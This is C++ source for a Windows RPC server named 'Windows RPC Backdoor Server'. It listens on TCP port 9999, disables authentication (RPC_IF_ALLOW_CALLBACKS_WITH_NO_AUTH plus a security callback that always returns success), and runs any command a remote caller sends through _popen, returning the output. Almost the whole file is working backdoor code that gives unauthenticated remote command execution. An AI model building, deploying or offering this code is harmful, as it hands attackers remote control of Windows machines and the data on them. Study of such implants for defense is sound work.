#include <iostream>
#include "rpc_backdoor_server.h"
#include <stdlib.h>
#include <ctype.h>
#include <windows.h>
#include <atlstr.h>

#pragma comment(lib, "rpcrt4.lib")
#pragma comment(lib, "ws2_32.lib")


void exec_cmd(LPSTR cmd, LPSTR* output) {
	char   psBuffer[1024];
	FILE* pPipe;
	std::string output_str;
	if ((pPipe = _popen(cmd, "rt")) == NULL)
		exit(1);

	while (fgets(psBuffer, 1024, pPipe)) {

		output_str.append(psBuffer);
	}

	if (feof(pPipe))
		printf("\nProcess returned %d\n", _pclose(pPipe));

	*output = strdup(output_str.c_str());
}


void backdoor(LPSTR* cmd, LPSTR* output) {

	printf("[*] backdoor is called");

	std::cout << "[*] Executing the command: " << *cmd << "\n";
	exec_cmd(*cmd, output);
	//std::cout << "[+] Output " << *output << "\n";
}


RPC_STATUS CALLBACK SecurityCallback(RPC_IF_HANDLE Interface, void* pBindingHandle) {
	return RPC_S_OK;
}


int main(int argc, char **argv) {

	std::cout << "[+] Server started listening on port 9999\n";

	RPC_STATUS status;
	RPC_BINDING_VECTOR* pbindingVector = 0;

	status = RpcServerUseProtseqEpW(
		(RPC_WSTR)L"ncacn_ip_tcp",
		RPC_C_PROTSEQ_MAX_REQS_DEFAULT,
		(RPC_WSTR)L"9999",
		NULL
	);

	status = RpcServerRegisterIf2(
		BackdoorInterface_v1_0_s_ifspec,
		NULL,
		NULL,
		RPC_IF_ALLOW_CALLBACKS_WITH_NO_AUTH,
		RPC_C_LISTEN_MAX_CALLS_DEFAULT,
		(unsigned)-1,
		SecurityCallback
	);

	status = RpcServerInqBindings(&pbindingVector);
	status = RpcEpRegisterW(
		BackdoorInterface_v1_0_s_ifspec,
		pbindingVector,
		0,
		(RPC_WSTR)L"Windows RPC Backdoor Server"
	);

	status = RpcServerListen(
		1,
		RPC_C_LISTEN_MAX_CALLS_DEFAULT,
		FALSE
	);


}

void* __RPC_USER midl_user_allocate(size_t size) {
	return malloc(size);
}

void __RPC_USER midl_user_free(void* p) {
	free(p);
}
